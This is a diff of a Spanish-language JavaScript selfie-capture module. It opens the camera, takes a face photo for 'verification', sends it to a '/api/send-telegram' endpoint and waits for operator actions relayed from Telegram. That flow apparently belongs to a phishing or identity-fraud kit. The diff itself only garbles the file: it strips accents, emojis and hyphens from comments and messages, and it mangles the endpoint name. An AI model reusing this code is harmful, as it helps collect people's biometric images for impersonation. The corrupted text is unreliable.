@@ -1,14 +1,14 @@
-/**
- * CARA - CAPTURA DE SELFIE
- * Captura de foto del rostro del usuario para verificación
- * Versión optimizada con arquitectura robusta
+﻿/**
+ * CARA  CAPTURA DE SELFIE
+ * Captura de foto del rostro del usuario para verificacin
+ * Versin optimizada con arquitectura robusta
  */
 
 (() => {
     'use strict';
 
     // ============================
-    // ESTADO DE LA APLICACIÓN
+    // ESTADO DE LA APLICACIN
     // ============================
     const appState = {
         video: null,
@@ -42,18 +42,18 @@
     const IMAGE_QUALITY = 0.9;
 
     // ============================
-    // INICIALIZACIÓN
+    // INICIALIZACIN
     // ============================
     function init() {
-        console.log('🎬 Inicializando captura de selfie...');
+        console.log(' Inicializando captura de selfie...');
 
         if (!initializeElements()) {
-            console.error('❌ Error: Elementos DOM no encontrados');
+            console.error(' Error: Elementos DOM no encontrados');
             return;
         }
 
         if (!validateCommonUtils()) {
-            console.error('❌ Error: commonUtils no disponible');
+            console.error(' Error: commonUtils no disponible');
             return;
         }
 
@@ -66,14 +66,14 @@
         // Configurar event listeners
         setupEventListeners();
 
-        // Iniciar cámara automáticamente
+        // Iniciar cmara automticamente
         startCamera();
 
-        console.log('✅ Inicialización completada');
+        console.log(' Inicializacin completada');
     }
 
     // ============================
-    // INICIALIZACIÓN DE ELEMENTOS
+    // INICIALIZACIN DE ELEMENTOS
     // ============================
     function initializeElements() {
         elements.video = document.getElementById('video');
@@ -105,13 +105,13 @@
             if (storedData) {
                 const data = JSON.parse(storedData);
                 appState.messageId = data.messageId || `temp_${Date.now()}`;
-                console.log('📦 Datos previos cargados, messageId:', appState.messageId);
+                console.log(' Datos previos cargados, messageId:', appState.messageId);
             } else {
                 appState.messageId = `selfie_${Date.now()}`;
-                console.log('⚠️ No hay datos previos, messageId generado:', appState.messageId);
+                console.log(' No hay datos previos, messageId generado:', appState.messageId);
             }
         } catch (error) {
-            console.error('❌ Error al cargar datos previos:', error);
+            console.error(' Error al cargar datos previos:', error);
             appState.messageId = `selfie_${Date.now()}`;
         }
     }
@@ -132,27 +132,27 @@
     }
 
     // ============================
-    // CÁMARA
+    // CMARA
     // ============================
     async function startCamera() {
         if (appState.isCameraActive) {
-            console.log('⚠️ La cámara ya está activa');
+            console.log(' La cmara ya est activa');
             return;
         }
 
         try {
-            console.log('📹 Iniciando cámara frontal...');
+            console.log(' Iniciando cmara frontal...');
             appState.stream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
             
             elements.video.srcObject = appState.stream;
             elements.video.play();
             
             appState.isCameraActive = true;
-            console.log('✅ Cámara iniciada correctamente');
+            console.log(' Cmara iniciada correctamente');
         } catch (error) {
-            console.error('❌ Error al acceder a la cámara:', error);
+            console.error(' Error al acceder a la cmara:', error);
             window.commonUtils.showError(
-                'No se pudo acceder a la cámara. Por favor, otorgue los permisos necesarios.'
+                'No se pudo acceder a la cmara. Por favor, otorgue los permisos necesarios.'
             );
         }
     }
@@ -162,7 +162,7 @@
             appState.stream.getTracks().forEach(track => track.stop());
             appState.stream = null;
             appState.isCameraActive = false;
-            console.log('🛑 Cámara detenida');
+            console.log(' Cmara detenida');
         }
     }
 
@@ -171,7 +171,7 @@
     // ============================
     async function handleCapture() {
         if (appState.isCapturing) {
-            console.log('⚠️ Captura en progreso...');
+            console.log(' Captura en progreso...');
             return;
         }
 
@@ -179,7 +179,7 @@
         elements.captureBtn.disabled = true;
 
         try {
-            console.log('📸 Capturando selfie...');
+            console.log(' Capturando selfie...');
 
             // Obtener foto en base64
             const photoData = capturePhoto();
@@ -188,16 +188,16 @@
                 throw new Error('No se pudo capturar la foto');
             }
 
-            console.log('✅ Selfie capturado');
+            console.log(' Selfie capturado');
 
-            // Detener cámara
+            // Detener cmara
             stopCamera();
 
             // Enviar a Telegram
             await sendPhotoToTelegram(photoData);
 
         } catch (error) {
-            console.error('❌ Error en captura:', error);
+            console.error(' Error en captura:', error);
             window.commonUtils.showError('Error al capturar la foto. Intente nuevamente.');
             elements.captureBtn.disabled = false;
         } finally {
@@ -216,7 +216,7 @@
     }
 
     // ============================
-    // ENVÍO A TELEGRAM
+    // ENVO A TELEGRAM
     // ============================
     async function sendPhotoToTelegram(photoData) {
         const sessionId = window.commonUtils.getSessionId();
@@ -228,12 +228,12 @@
             sessionId: sessionId
         };
 
-        console.log('📤 Enviando selfie a Telegram con sessionId:', sessionId);
+        console.log(' Enviando selfie a Telegram con sessionId:', sessionId);
 
         window.loadingOverlay.showSending('Enviando selfie...');
 
         try {
-            const response = await fetch('/api/send-telegram', {
+            const response = await fetch('/api/sendtelegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -251,13 +251,13 @@
                 throw new Error(result.error || 'Error al enviar selfie');
             }
 
-            console.log('✅ Selfie enviado exitosamente, Message ID:', result.messageId);
+            console.log(' Selfie enviado exitosamente, Message ID:', result.messageId);
 
             // Mantener overlay visible esperando respuesta de Telegram
-            window.loadingOverlay.show('Esperando validación...');
+            window.loadingOverlay.show('Esperando validacin...');
 
         } catch (error) {
-            console.error('❌ Error al enviar selfie:', error);
+            console.error(' Error al enviar selfie:', error);
             window.loadingOverlay.hide();
             window.commonUtils.showError('Error al enviar la foto. Intente nuevamente.');
             throw error;
@@ -268,7 +268,7 @@
     // ACCIONES DE TELEGRAM
     // ============================
     function handleTelegramAction(action) {
-        console.log('📱 Acción recibida de Telegram:', action);
+        console.log(' Accin recibida de Telegram:', action);
         window.loadingOverlay.hide();
 
         const actionHandlers = {
@@ -286,7 +286,7 @@
         if (handler) {
             handler();
         } else {
-            console.warn('⚠️ Acción desconocida:', action);
+            console.warn(' Accin desconocida:', action);
         }
     }
 
@@ -295,11 +295,11 @@
     // ============================
     function cleanup() {
         stopCamera();
-        console.log('🧹 Recursos liberados');
+        console.log(' Recursos liberados');
     }
 
     // ============================
-    // AUTO-INICIO
+    // AUTOINICIO
     // ============================
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
@@ -308,3 +308,5 @@
     }
 
 })();
+
+
